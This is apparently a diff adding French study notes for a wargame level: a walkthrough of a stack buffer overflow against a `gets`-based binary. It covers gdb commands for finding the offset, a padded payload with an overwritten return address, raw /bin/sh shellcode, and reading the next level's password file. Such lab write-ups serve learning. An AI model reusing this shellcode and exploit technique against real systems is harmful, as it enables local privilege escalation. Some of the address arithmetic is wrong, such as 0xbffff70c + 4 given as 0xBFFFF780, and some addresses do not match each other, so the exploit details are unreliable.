@@ -1,0 +1,40 @@
+https://0xrick.github.io/binary-exploitation/bof5/
+https://en.wikipedia.org/wiki/Shellcode
+https://wiki.skullsecurity.org/index.php?title=Registers
+
+
+On voit que la function gets est appelé (elle est vulnérable)
+On essaye de faire un exploit avec un buffer overflow
+
+On peut tester avec python pour trouvé la taille du buffer 
+>> python -c "print 'A' * 100" | ./level1
+
+Pour trouver le buffer avec gdb:
+	
+	On break apres le gets {b *0x08048495}
+	On run
+	On lui envoie une chaine de 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA' pour remplir le buffer
+	On cherche l'adresse EIP avec {info frame} >> 0xbffff70c
+	On cherche maintenant l'adresse de debut du buffer en affichant 24 mots au début de la stack avec {x/24wx $esp} ($esp = top of the stack)
+	On voit que la seconde ligne à l'adresse 0xbffff6c0 contient plein de 'A' (41), c'est le début du buffer
+	Dans gdb on fait la difference des 2 adresse pour obtenir la taille du buffer {p/d 0xbffff77c - 0xbffff730} = 76
+
+Partie exploit, on va créer un fichier python pour lancer un shell en exploitant level1
+
+	Il va contenir:
+
+		Un padding: une string de 76 carractère pour remplir le buffer
+			pad = "\x41" * 76
+
+		Ensuite après que le buffer soit rempli on sera sur l'adresse EIP, on a besoin de la nouvelle EIP donc 4 bits après celle d'origine 0xbffff70c, 0xbffff70c + 4 = 0xBFFFF780
+		mais il nous la faut en reverse donc struct.pack("I" , 0xbffff780) = \x80\xf7\xff\xbf
+			import struct
+			EIP = struct.pack("I", 0xbffff780)
+
+		Un shellcode écrit en hexa, qui fera office de payload pour executer une commande en tant que level2, ici /bin/sh
+			shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+		Un NOP (no Operation) pour être sur que l'exploit ne fail pas (à approfondir) peut être n'importe quoi ici 100 chars 
+	
+python exploit.py | ./level1
+$ cat /home/user/level2/.pass
